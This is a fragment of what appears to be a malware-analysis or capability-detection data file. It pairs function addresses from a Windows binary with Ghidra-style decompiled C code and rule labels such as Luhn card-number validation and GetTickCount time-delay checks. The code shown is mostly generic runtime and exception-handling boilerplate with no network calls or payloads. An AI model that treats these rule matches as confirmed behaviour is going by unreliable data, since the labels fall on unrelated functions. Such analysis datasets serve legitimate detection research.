fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeec = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeec + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffed0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffed0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_fffffeb4 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_fffffeb4 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 2564
    },
    "004c05e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c05e0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*param_1 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528da4, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff08 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff08 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 2003
    },
    "004c0640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c0640(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    int32_t *var_8h;\n    uint var_ch;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar2 = fcn.00451af0();\n    puVar1 = *var_8h + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*var_8h + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffe8 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528db0, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffe8 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffcc = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dbc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffcc + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffffb0 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528ddc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffffb0 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff94 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528dfc, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff94 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff78 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e08, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff78 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff5c = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e40, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff5c + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff40 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e4c, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff40 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        in_stack_ffffff24 = 0x5285b0;\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e58, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    uVar2 = fcn.00451af0();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar2 || *puVar1 == uVar2) || (iVar3 = *(*(*in_stack_ffffff24 + 4) + uVar2 * 4),  iVar3 == 0)) {\n        fcn.004bde60();\n    }\n    else {\n        iVar3 = fcn.004c33d0(iVar3, 0x5285b0, 0x528e64, 0);\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n    }\n    fcn.004c2de0();\n    iVar3 = fcn.00454d90();\n    iVar4 = fcn.00454d90();\n    if (iVar3 == iVar4) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar3 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar3 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1836
    },
    "004c09a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004c09a0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_10h;\n    uint arg_ch;\n    uint s1;\n    uint var_8h;\n    uint var_ch;\n    \n    iVar1 = fcn.00454d90();\n    iVar2 = fcn.00454d90();\n    if (iVar1 == iVar2) {\n        arg_10h = fcn.00454d90();\n        arg_ch = fcn.00454bf0();\n        s1 = fcn.00454bf0();\n        iVar1 = fcn.0048f5c0(s1, arg_ch, arg_10h);\n        if (iVar1 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 178
    },
    "004c2c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c2c70(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (param_1 == 0) {\n        param_1 = 1;\n    }\n    while( true ) {\n        iVar1 = sub.msvcrt.dll_malloc(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        pcVar2 = fcn.004bd650();\n        if (pcVar2 == NULL) break;\n        (*pcVar2)();\n    }\n    puVar3 = fcn.004c2d80(4);\n    *puVar3 = 0x52ccdc;\n    iVar1 = 0x528e14;\n    fcn.004c3330(puVar3, 0x528e14, fcn.004bba10);\n    if (iVar1 == 0) {\n        iVar1 = 1;\n    }\n    while( true ) {\n        iVar4 = sub.msvcrt.dll_malloc(iVar1);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        pcVar2 = fcn.004bd650();\n        if (pcVar2 == NULL) break;\n        (*pcVar2)();\n    }\n    return 0;\n}\n",
        "token_count": 299
    },
    "004c2ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c2ec0(uint32_t *param_1)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    ulong uVar9;\n    int32_t iStack24;\n    \n    if ((param_1 == NULL) ||\n       (fcn.004c2e40(param_1),  iVar7 = param_1[1] + 0xb8b1aabc + (0x432b2aff < *param_1), \n       iVar7 != 0 || -iVar7 < (1 < *param_1 + 0xbcd4d500))) {\n        fcn.004bf910();\n    }\n    fcn.00447fc0(param_1[-9]);\n    fcn.004c2e40(iStack24);\n    uVar5 = *(iStack24 + -0x18);\n    uVar1 = *(iStack24 + -0x24);\n    uVar3 = fcn.00447fe0(*(iStack24 + -0x28));\n    fcn.004c2e40(uVar3);\n    fcn.004c30e0();\n    while( true ) {\n        fcn.00447c80();\n        cVar2 = fcn.00447d60(uVar5);\n        if (cVar2 != '\\0') break;\n        cVar2 = fcn.00447d60(uVar5);\n        if (cVar2 != '\\0') goto code_r0x004c3c5e;\n        fcn.00447fc0(uVar1);\n    }\n    fcn.004c32d0();\ncode_r0x004c3c5e:\n    puVar4 = fcn.004c2d80(4);\n    *puVar4 = 0x52c0b4;\n    fcn.004c3330(puVar4, 0x528938, 0x496100);\n    uVar5 = sub.msvcrt.dll_abort();\n    fcn.004c2e40(uVar5);\n    uVar9 = sub.msvcrt.dll_abort();\n    fcn.004c2fb0();\n    pcVar8 = (uVar9 >> 0x20) + 1;\n    if (pcVar8 != NULL) {\n        fcn.0043a8e0(uVar9);\n    }\n    uVar9 = fcn.004c2f10();\n    uVar5 = uVar9;\n    if (uVar9 >> 0x20 != 1) goto code_r0x004c3d3d;\n    piVar6 = fcn.004c2e40(uVar5);\n    uVar5 = (**(*piVar6 + 8))();\n    uVar3 = (*pcVar8)(2);\n    sub.msvcrt.dll_fwrite(\"  what():  \", 1, 0xb, uVar3);\n    uVar3 = (*pcVar8)(2);\n    sub.msvcrt.dll_fputs(uVar5, uVar3);\n    uVar5 = (*pcVar8)(2);\n    sub.msvcrt.dll_fputc(10, uVar5);\n    fcn.004c2fb0();\n    do {\n        sub.msvcrt.dll_abort();\n        uVar5 = uVar1;\n        fcn.00446e88(uVar1);\n        fcn.004c32d0();\ncode_r0x004c3d3d:\n        fcn.004c2e40(uVar5);\n        fcn.004c2fb0();\n    } while( true );\n}\n",
        "token_count": 816
    },
    "004c30c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004c30c0(void)\n\n{\n    fcn.0043c420(0x517504);\n    return;\n}\n",
        "token_count": 31
    },
    "004c3210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004c3210(uchar *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *unaff_EBX;\n    int32_t *unaff_EBP;\n    ulong uVar4;\n    uchar *in_stack_00000034;\n    int32_t in_stack_00000038;\n    uint uVar5;\n    \n    param_1[1] = 0;\n    *param_1 = 1;\n    piVar3 = *0x515a34;\n    if ((*0x515a34 == NULL) || (piVar3 = fcn.004384b0(*0x5168e0),  piVar3 == NULL)) {\n        return piVar3;\n    }\n    uVar4 = fcn.00449d40();\n    if (uVar4 >> 0x20 == -1) {\n        fcn.004c2f10(uVar4);\n    }\n    uVar4 = fcn.0043a8e0();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar4);\n    }\n    uVar4 = fcn.004c2f10();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar4);\n    }\n    uVar4 = fcn.004c2f10();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar4);\n    }\n    uVar4 = fcn.004c2f10();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar4);\n    }\n    uVar4 = fcn.004c2f10();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar4);\n    }\n    uVar4 = fcn.004c2f10();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar4);\n    }\n    fcn.004c2f10();\n    *unaff_EBX = 0x52c8b4;\n    fcn.004aea60();\n    fcn.0043a8e0();\n    *unaff_EBX = 0x52c8e0;\n    fcn.004aea60();\n    fcn.0043a8e0();\n    fcn.004c2c30();\n    fcn.0043a8e0();\n    fcn.004c2c30();\n    fcn.0043a8e0();\n    *unaff_EBX = 0x52c8b4;\n    fcn.004aea60();\n    fcn.0043a8e0();\n    *unaff_EBX = 0x52c8e0;\n    fcn.004aea60();\n    uVar4 = fcn.0043a8e0();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar4);\n    }\n    uVar4 = fcn.004c2f10();\n    if (uVar4 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar4);\n    }\n    uVar4 = fcn.004c2f10();\n    uVar5 = uVar4;\n    if (uVar4 >> 0x20 != 1) {\ncode_r0x004c4e66:\n        fcn.004c2e40(uVar5);\n        iVar2 = *(*unaff_EBP + -0xc);\n        puVar1 = unaff_EBP + iVar2 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(unaff_EBP + iVar2 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n        if (in_stack_00000038 < 1) {\n            iVar2 = unaff_EBP[1];\n        }\n        else {\n            *in_stack_00000034 = 0;\n            iVar2 = unaff_EBP[1];\n        }\n        if (iVar2 != 0) {\n            return unaff_EBP;\n        }\n        fcn.004bbce0(*(unaff_EBP + *(*unaff_EBP + -0xc) + 0x14) | 4);\n        return unaff_EBP;\n    }\n    fcn.004c2e40(uVar5);\n    unaff_EBP = unaff_EBP + *(*unaff_EBP + -0xc);\n    unaff_EBP[5] = unaff_EBP[5] | 1;\n    if ((*(unaff_EBP + 4) & 1) != 0) {\n        fcn.004c32d0();\n        goto code_r0x004c4e66;\n    }\n    piVar3 = fcn.004c32d0();\n    fcn.004c2fb0();\n    uVar4 = fcn.0043a8e0(piVar3);\n    uVar5 = uVar4;\n    if (uVar4 >> 0x20 == 1) {\n        fcn.004c2e40(uVar5);\n        piVar3 = piVar3 + *(*piVar3 + -0xc);\n        piVar3[5] = piVar3[5] | 1;\n        if ((*(piVar3 + 4) & 1) != 0) {\n            fcn.004c32d0();\n            goto code_r0x004c4eed;\n        }\n    }\n    else {\ncode_r0x004c4eed:\n        fcn.004c2e40(uVar5);\n        iVar2 = *(*piVar3 + -0xc);\n        puVar1 = piVar3 + iVar2 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(piVar3 + iVar2 + 0x10) & 1) == 0) goto code_r0x00487da6;\n        fcn.004c32d0();\n    }\n    piVar3 = fcn.004c32d0();\n    fcn.004c2fb0();\n    fcn.0043a8e0(piVar3);\ncode_r0x00487da6:\n    fcn.004c2fb0();\n    return piVar3;\n}\n",
        "token_count": 1484
    },
    "004c32d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004c32d0(void)\n\n{\n    int32_t *piVar1;\n    int32_t extraout_EDX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    piVar1 = fcn.004c30c0();\n    iVar2 = *piVar1;\n    piVar1[1] = piVar1[1] + 1;\n    if (iVar2 == 0) goto code_r0x004c3321;\n    iVar3 = *(iVar2 + 0x34) + -0x474e5544 + (0x432b2aff < *(iVar2 + 0x30));\n    if (iVar3 == 0 && (1 < *(iVar2 + 0x30) + 0xbcd4d500) <= -iVar3) goto code_r0x004c3326;\n    *piVar1 = 0;\n    do {\n        fcn.0043a980(iVar2 + 0x30);\n        fcn.004c2e40(iVar2 + 0x30);\ncode_r0x004c3321:\n        fcn.004bf910();\n        iVar2 = extraout_EDX;\ncode_r0x004c3326:\n        *(iVar2 + 0x14) = -*(iVar2 + 0x14);\n    } while( true );\n}\n",
        "token_count": 300
    },
    "004c3330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004c3330(int32_t param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    uint32_t uStack120;\n    uint uStack76;\n    uint uStack44;\n    int32_t iStack40;\n    \n    iVar1 = fcn.004c30c0();\n    *(iVar1 + 4) = *(iVar1 + 4) + 1;\n    *(param_1 + -0x60) = 0;\n    *(param_1 + -0x50) = param_2;\n    *(param_1 + -0x4c) = param_3;\n    uVar2 = fcn.004bd630();\n    *(param_1 + -0x48) = uVar2;\n    uVar2 = fcn.004bd010();\n    *(param_1 + -0x20) = 0x432b2b00;\n    *(param_1 + -0x44) = uVar2;\n    *(param_1 + -0x1c) = 0x474e5543;\n    *(param_1 + -0x18) = 0x447e30;\n    *(param_1 + -0x60) = 1;\n    fcn.0043a6e0();\n    fcn.004c2e40();\n    fcn.004bf910();\n    puVar3 = fcn.004c2d80();\n    *puVar3 = 0x52c7c8;\n    fcn.004c3330();\n    piVar5 = *(*0x528bbc + -8) + 0x528bbc;\n    if (*(*piVar5 + -4) == *(*0x528bbc + -4)) {\n        iVar1 = iStack40;\n        (**(**(*0x528bbc + -4) + 0x1c))(iStack40, 6, uStack44, piVar5);\n        if ((uStack120 & 6) == 6) {\n            return 0x4ab9b0;\n        }\n        if (uStack120 == 0) {\n            if (iStack40 < 0) {\n                if ((iStack40 != -2) &&\n                   (uVar4 = (**(*(param_1 + -0x20) + 0x20))(iStack40, 0x4ab9b0, uStack76, 0x528bbc),  (uVar4 & 6) == 6))\n                {\n                    return iVar1;\n                }\n            }\n            else if (iStack40 == 0x7d20c) {\n                return 0x4ab9b0;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 631
    },
    "00437ed0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.00437ed0(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint *puVar2;\n    uint32_t uStack8;\n    \n    puVar2 = &stack0x00000004;\n    uVar1 = in_EAX;\n    if (0xfff < in_EAX) {\n        do {\n            puVar2 = puVar2 + -0x400;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack8 = in_EAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack8;\n}\n",
        "token_count": 173
    },
    "00451040": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00451040(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_bp_4h;\n    \n    (**(*arg_8h + 0x10))(arg_8h, arg_ch);\n    fcn.00490630(var_20h, var_1ch);\n    if (var_20h != &var_18h) {\n        fcn.004c2c30(var_20h);\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "00491d90": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
